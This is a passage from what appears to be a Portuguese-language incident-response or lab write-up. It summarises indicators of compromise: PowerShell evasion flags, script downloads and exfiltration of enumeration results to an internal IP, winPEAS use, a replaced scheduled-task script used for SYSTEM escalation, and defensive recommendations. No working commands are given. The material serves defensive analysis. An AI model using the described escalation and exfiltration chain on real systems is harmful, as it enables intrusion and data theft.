O atacante validou permissões com `icacls` e, ao confirmar fragilidades, usou `Invoke-WebRequest` para implantar um payload malicioso. Esta técnica é comum em **ataques de persistência e privilege escalation**, explorando **tarefas de sistema mal configuradas**.

<br/>
<br/>

## ✅ **Conclusão da Fase 2**

<br/>
<br/>

#### **Resumo dos indicadores detetados:**

- **Execução de PowerShell com parâmetros de evasão**, incluindo `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`.
- **Download de scripts via HTTP** através de `Invoke-WebRequest` e `DownloadString`, envolvendo IP interno `192.168.1.205` na porta `8080`.
- **Ferramenta de enumeração `winPEAS` transferida e executada** no sistema.
- **Exfiltração de dados com `Invoke-RestMethod`**, enviando ficheiros `.txt` com resultados da enumeração para o servidor remoto.
- **Substituição de script legítimo (`svc_launcher.ps1`) por versão maliciosa**, com permissões permissivas na pasta `C:\TempTask\`.
- **Técnica de Escalada de Privilégios via tarefa agendada**, visando execução com permissões SYSTEM.

<br/>
<br/>
    
#### 🔐 **Recomendações:**

- **Monitorizar e bloquear o uso de PowerShell com parâmetros suspeitos** (`Bypass`, `Hidden`, `NoProfile`) através de regras em EDR/SIEM.
- **Restringir comunicações para IPs internos em portas incomuns** (ex: `8080`) e inspecionar atividades de rede não autorizadas.
- **Aplicar permissões rigorosas em diretórios sensíveis**, como `C:\TempTask\`, impedindo escrita por utilizadores sem privilégios elevados.
- **Auditar e validar tarefas agendadas** que executam scripts PowerShell no arranque.
- **Implementar AppLocker ou WDAC** para limitar a execução de scripts não assinados e ferramentas de pós-exploração

---

<br/>
<br/>
